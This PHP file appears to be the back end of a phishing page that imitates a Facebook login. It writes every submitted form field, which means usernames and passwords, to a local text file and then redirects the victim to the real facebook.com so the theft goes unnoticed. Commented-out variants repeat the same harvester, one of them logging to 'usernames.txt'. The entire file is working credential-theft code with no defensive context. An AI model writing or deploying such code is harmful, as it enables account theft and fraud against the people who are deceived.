<?php


$file= fopen("log.txt","a");
fwrite($file, "\t\t\t\t\t\t");
fwrite($file, "\r\n");
foreach($_POST as $variable => $value) {
fwrite($file,"\t\t\t\t\t\t");
	fwrite($file, $variable);
	fwrite($file, "=");
	fwrite($file, $value);
	fwrite($file, "\r\n");
}
	fwrite($file, "\r\n");
fwrite($file,"\t\t\t\t\t\t");
fclose($file);
header ('Location: http://www.facebook.com');
die()


/*
// Set the location to redirect the page
header ('Location: http://www.facebook.com');

// Open the text file in writing mode
$file = fopen("log.txt", "a");

foreach($_POST as $variable => $value) {
	fwrite($file, $variable);
	fwrite($file, "=");
	fwrite($file, $value);
	fwrite($file, "rn");
}

fwrite($file, "\r\n");
fclose($file);
exit;


// header (‘Location: http://www.facebook.com/’);
// $handle = fopen(“usernames.txt”, “a”);
// foreach($_POST as $variable => $value) {
// fwrite($handle, $variable);
// fwrite($handle, “=”);
// fwrite($handle, $value);
// fwrite($handle, “rn”);
// }
// fwrite($handle, “rn”);
// fclose($handle);
// exit;

*/
?>


